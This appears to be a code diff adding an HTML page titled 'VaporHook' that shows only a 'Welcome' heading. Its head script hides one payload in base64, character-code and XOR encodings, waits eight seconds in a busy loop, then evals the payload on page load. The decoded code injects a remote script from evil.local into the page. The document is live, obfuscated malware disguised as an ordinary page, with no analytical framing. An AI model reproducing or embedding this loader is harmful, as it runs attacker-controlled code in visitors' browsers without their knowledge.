@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html><head><title>VaporHook</title><script>
+const PAYLOAD_FORMAT = "base64";
+
+const payload_base64 = "Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CnNjcmlwdC5zcmMgPSAiaHR0cDovL2V2aWwubG9jYWwvbWFsaWNpb3VzLmpzIjsKZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwo=";
+const payload_charcode = String.fromCharCode(99,111,110,115,116,32,115,99,114,105,112,116,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,10,115,99,114,105,112,116,46,115,114,99,32,61,32,34,104,116,116,112,58,47,47,101,118,105,108,46,108,111,99,97,108,47,109,97,108,105,99,105,111,117,115,46,106,115,34,59,10,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,115,99,114,105,112,116,41,59,10);
+const xor_payload = [42, 38, 39, 58, 61, 105, 58, 42, 59, 32, 57, 61, 105, 116, 105, 45, 38, 42, 60, 36, 44, 39, 61, 103, 42, 59, 44, 40, 61, 44, 12, 37, 44, 36, 44, 39, 61, 97, 107, 58, 42, 59, 32, 57, 61, 107, 96, 114, 67, 58, 42, 59, 32, 57, 61, 103, 58, 59, 42, 105, 116, 105, 107, 33, 61, 61, 57, 115, 102, 102, 44, 63, 32, 37, 103, 37, 38, 42, 40, 37, 102, 36, 40, 37, 32, 42, 32, 38, 60, 58, 103, 35, 58, 107, 114, 67, 45, 38, 42, 60, 36, 44, 39, 61, 103, 33, 44, 40, 45, 103, 40, 57, 57, 44, 39, 45, 10, 33, 32, 37, 45, 97, 58, 42, 59, 32, 57, 61, 96, 114, 67];
+const xor_key = 73;
+
+function runPayload() {
+  if (PAYLOAD_FORMAT === "base64") eval(atob(payload_base64));
+  else if (PAYLOAD_FORMAT === "charcode") eval(payload_charcode);
+  else if (PAYLOAD_FORMAT === "xor") {
+    let d = "";
+    for (let i = 0; i < xor_payload.length; i++) {
+      d += String.fromCharCode(xor_payload[i] ^ xor_key);
+    }
+    eval(d);
+  }
+}
+
+let t = Date.now();
+while (Date.now() - t < 8000) {}
+
+runPayload();
+</script></head><body><h1>Welcome</h1></body></html>
